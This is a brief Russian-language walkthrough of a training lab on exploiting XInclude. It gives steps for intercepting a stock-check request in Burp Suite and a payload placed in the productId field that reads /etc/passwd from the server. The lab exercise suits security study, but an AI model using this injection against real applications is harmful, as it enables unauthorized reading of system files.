## Lab: Exploiting XInclude to retrieve files
1) Переходим на сайт задания и выбираем любой продукт.
2) Нажимаем "Check stock" и перехватываем запрос через Burp Suite.
3) В значение productId вставляем
```php
  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
![](https://github.com/NaylyaZh99/hacking/blob/master/lab%20XXE/task3/image.png)

Готово!
